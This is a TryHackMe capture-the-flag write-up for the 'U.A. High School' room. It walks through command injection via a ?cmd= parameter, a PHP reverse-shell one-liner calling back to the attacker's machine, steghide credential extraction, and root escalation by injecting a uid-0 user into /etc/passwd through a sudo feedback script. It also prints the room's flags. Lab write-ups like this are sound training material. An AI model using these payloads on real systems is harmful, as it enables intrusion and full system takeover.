## U.A. High School - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/yueiua)

Join us in the mission to protect the digital world of superheroes! 
U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.

Our site is a reflection of our school values, designed by our engineers with incredible Quirks. 
We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.

Please allow the machine 3 - 5 minutes to fully boot.

**IP: 10.10.50.138**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, Steghide<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap and Gobuster.

  ```
  nmap -sC -sV 10.10.50.138
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 20:50 BST
  Nmap scan report for 10.10.50.138
  Host is up (0.051s latency).
  Not shown: 998 closed tcp ports (reset)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 cb:08:2e:b9:aa:12:e6:b7:ce:14:dc:65:7c:7a:95:da (RSA)
  |   256 7d:e5:31:0e:7c:d3:2e:f5:91:13:65:a5:d2:1d:d0:e3 (ECDSA)
  |_  256 26:2c:c2:0e:c2:f0:53:7b:9a:d1:4e:95:b2:f2:0d:1a (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: U.A. High School
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.50.138/ -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /assets               (Status: 301) [Size: 313] [--> http://10.10.50.138/assets/]
  /index.html           (Status: 200) [Size: 1988]
  /server-status        (Status: 403) [Size: 277]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  
  gobuster dir -u http://10.10.50.138/assets/ -w /usr/share/wordlists/dirb/common.txt
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /images               (Status: 301) [Size: 320] [--> http://10.10.50.138/assets/images/]
  /index.php            (Status: 200) [Size: 0]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When you visit `/images`, page will be blank. So I was like, what if I do `?cmd=ls` and guess what?

  ```
  http://10.10.50.138/assets/?cmd=ls
  aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==

  echo 'aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==' | base64 -d                
  images
  index.php
  styles.css
  
  http://10.10.50.138/assets/?cmd=ls%20images
  b25lZm9yYWxsLmpwZwp5dWVpLmpwZwo=
  
  echo 'b25lZm9yYWxsLmpwZwp5dWVpLmpwZwo=' | base64 -d        
  oneforall.jpg
  yuei.jpg
  ```
  
- COMMAND INJECTION TUTORIAL GUYS!

---

## ⚙️ Shell Access

- Since we already have a command injection, getting a shell is simple. I used `php -r '$sock=fsockopen("YOUR-THM-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`. Don't forget to URL encode it!

  ```
  http://10.10.50.138/assets/?cmd=php+-r+'$sock%3dfsockopen("[YOUR-THM-IP]",4444)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'

  nc -lvnp 4444               
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.50.138] 55504
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Switch it to Putty and start enumerating.

---

## 🧍 User Privilege Escalation

- There is a passphrase in `Hidden_Content` directory.

  ```
  www-data@ip-10-10-50-138:/var/www/Hidden_Content$ ls -al
  total 12
  drwxrwxr-x 2 www-data www-data 4096 Jul  9  2023 .
  drwxr-xr-x 4 www-data www-data 4096 Dec 13  2023 ..
  -rw-rw-r-- 1 www-data www-data   29 Jul  9  2023 passphrase.txt
  
  www-data@ip-10-10-50-138:/var/www/Hidden_Content$ cat passphrase.txt 
  QWxsbWlnaHRGb3JFdmVyISEhCg==

  echo 'QWxsbWlnaHRGb3JFdmVyISEhCg==' | base64 -d                            
  AllmightForEver!!!
  ```
  
- Since this is a passphrase and we have some images, you already know the next step. With hex edit change first 12 bytes to this: `FF D8 FF E0  00 10 4A 46  49 46 00 01`. After that use steghide and you will get credentials.

  ```
  hexedit oneforall.jpg
  
  steghide --extract -sf oneforall.jpg 
  Enter passphrase: 
  wrote extracted data to "creds.txt".
                                                                                                                       
  $ cat creds.txt             
  Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:
  
  deku:One?For?All_!!one1/A
  ```
  
- Login as `deku` and get the first flag.

  ```
  deku@ip-10-10-50-138:/var/www/html/assets/images$ cat /home/deku/user.txt 
  THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
  ```

---

## 👑 Root Privilege Escalation

- For root flag, `sudo -l` will do most of the work.

  ```
  deku@ip-10-10-50-138:/var/www/html/assets/images$ sudo -l
  [sudo] password for deku: 
  Matching Defaults entries for deku on ip-10-10-50-138:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User deku may run the following commands on ip-10-10-50-138:
      (ALL) /opt/NewComponent/feedback.sh
  ```
  
- When you check the script, you will see that the script takes input and outputs it in `/var/log/feedback.txt`.

  ```
  deku@ip-10-10-50-138:/var/www/html/assets/images$ cat /opt/NewComponent/feedback.sh 
  #!/bin/bash
  
  echo "Hello, Welcome to the Report Form       "
  echo "This is a way to report various problems"
  echo "    Developed by                        "
  echo "        The Technical Department of U.A."
  
  echo "Enter your feedback:"
  read feedback
  
  
  if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
      echo "It is This:"
      eval "echo $feedback"
  
      echo "$feedback" >> /var/log/feedback.txt
      echo "Feedback successfully saved."
  else
      echo "Invalid input. Please provide a valid input." 
  fi
  ```
  
- I experimented a bit and found the way in. First, on your local machine create a new password.

  ```
  mkpasswd -m md5crypt -s
  Password: 123
  $1$aWx5WA8f$7HEvDgXApxLhrtSqs2wcd0
  ```

- Now we are going to create a new user with this password and give it root credentials. We will add that user to `/etc/passwd` with `feedback.sh` script.

  ```
  deku@ip-10-10-50-138:~$ sudo /opt/NewComponent/feedback.sh 
  [sudo] password for deku: 
  Hello, Welcome to the Report Form       
  This is a way to report various problems
      Developed by                        
          The Technical Department of U.A.
  Enter your feedback:
  'jxf:$1$aWx5WA8f$7HEvDgXApxLhrtSqs2wcd0:0:0:jxf:/root:/bin/bash'>>/etc/passwd
  It is This:
  Feedback successfully saved.
  ```

- Now, let's confirm if it worked. If you don't get the same output that you inputed into the script, you did something wrong. User I created is named `jxf` and has password `123`, you can name it whatever you want and make whatever password you like.

  ```
  deku@ip-10-10-50-138:~$ tail -n1 /etc/passwd
  jxf:$1$aWx5WA8f$7HEvDgXApxLhrtSqs2wcd0:0:0:jxf:/root:/bin/bash
  ```

- Switch to newly created user and read the root flag.

  ```
  deku@ip-10-10-50-138:~$ su jxf
  Password: 
  root@ip-10-10-50-138:/home/deku# whoami
  root
  root@ip-10-10-50-138:/home/deku# id
  uid=0(root) gid=0(root) groups=0(root)
  
  root@ip-10-10-50-138:/home/deku# cat /root/root.txt 
  root@myheroacademia:/opt/NewComponent# cat /root/root.txt
  __   __               _               _   _                 _____ _          
  \ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
   \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
    | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
    |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                    _    _ 
               _   _        ___    | |  | |
              | \ | | ___  /   |   | |__| | ___ _ __  ___
              |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
              | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
              |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 
  
  THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
  ```

---

## 🏁 Flags

- **User Flag**: `THM{W3lC0m3_D3kU_1A_0n3f0rAll??}`
- **Root Flag**: `THM{Y0U_4r3_7h3_NUm83r_1_H3r0}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  ``

- What did I learn?
  ``

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
